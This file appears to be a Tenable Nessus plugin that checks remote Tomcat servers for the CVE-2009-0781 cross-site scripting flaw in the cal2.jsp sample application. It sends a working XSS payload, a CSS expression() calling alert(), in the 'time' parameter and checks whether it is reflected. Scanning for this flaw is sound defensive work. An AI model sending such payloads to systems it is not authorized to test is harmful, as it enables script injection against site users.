#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");


if (description)
{
  script_id(35806);
  script_version("$Revision: 1.3 $");

  script_cve_id("CVE-2009-0781");

  script_name(english:"Tomcat Sample App cal2.jsp time Parameter XSS (CVE-2009-0781)");
  script_summary(english:"Checks for an XSS flaw in Tomcat's cal2.jsp");

  script_set_attribute(
    attribute:"synopsis",
    value:string(
      "The remote web server contains a JSP application that is affected by a\n",
      "cross-site scripting vulnerability."
    )
  );
  script_set_attribute(
    attribute:"description", 
    value:string(
      "The remote web server includes an example JSP application, 'cal2.jsp',\n",
      "that fails to sanitize user-supplied input before using it to generate\n",
      "dynamic content.  An unauthenticated remote attacker may be able to\n",
      "leverage this issue to inject arbitrary HTML or script code into a\n",
      "user's browser to be executed within the security context of the\n",
      "affected site."
    )
  );
  script_set_attribute(
    attribute:"see_also", 
    value:"http://www.securityfocus.com/archive/1/501538/30/0/threaded"
  );
  script_set_attribute(
    attribute:"see_also", 
    value:"http://tomcat.apache.org/security-6.html"
  );
  script_set_attribute(
    attribute:"see_also", 
    value:"http://tomcat.apache.org/security-5.html"
  );
  script_set_attribute(
    attribute:"see_also", 
    value:"http://tomcat.apache.org/security-4.html"
  );
  script_set_attribute(
    attribute:"solution", 
    value:string(
      "Either undeploy the Tomcat examples web application, apply the\n",
      "appropriate patch referenced in the vendor advisory, or upgrade to\n",
      "Tomcat 6.0.20 / 5.5.28 / 4.1.40 when they become available."
    )
  );
  script_set_attribute(
    attribute:"cvss_vector", 
    value:"CVSS2#AV:N/AC:M/Au:N/C:N/I:P/A:N"
  );
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses : XSS");

  script_copyright(english:"This script is Copyright (C) 2009 Tenable Network Security, Inc.");

  script_dependencies("http_version.nasl", "cross_site_scripting.nasl");
  script_require_ports("Services/www", 8080);

  exit(0);
}


include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("url_func.inc");


port = get_http_port(default: 8080, embedded: 0);
if (get_kb_item("www/"+port+"/generic_xss")) exit(0);


# Unless we're paranoid, make sure the banner looks like Tomcat.
if (report_paranoia < 2)
{
  banner = get_http_banner(port:port);
  if (!banner || "Server: Apache-Coyote" >!< banner) exit(0);
}


# Send a request to exploit the flaw.
time = "8am";
xss = string(" STYLE=xss:e/**/xpression(try{a=firstTime}catch(e){firstTime=1;alert('", SCRIPT_NAME, "')});");

foreach dir (make_list("/examples/jsp", "/jsp-examples"))
{
  url = string(
    dir, "/cal/cal2.jsp?",
    "time=", time, urlencode(str:xss)
  );
  res = http_send_recv3(method:"GET", item:url, port:port);
  if (isnull(res)) exit(0);

  # There's a problem if our exploit appears along with the time in a form.
  if (
    "METHOD=POST ACTION=cal1.jsp" >< res[2] &&
    string('INPUT NAME="time" TYPE=HIDDEN VALUE=',time, xss) >< res[2]
  )
  {
    if (report_verbosity > 0)
    {
      report = string(
        "\n",
        "Nessus was able to exploit the issue using the following URL :\n",
        "\n",
        "  ", build_url(port:port, qs:url), "\n",
        "\n",
        "NB: use Internet Explorer to test this.\n"
      );
      security_warning(port:port, extra:report);
    }
    else security_warning(port);

    set_kb_item(name: 'www/'+port+'/XSS', value: TRUE);
  }
}
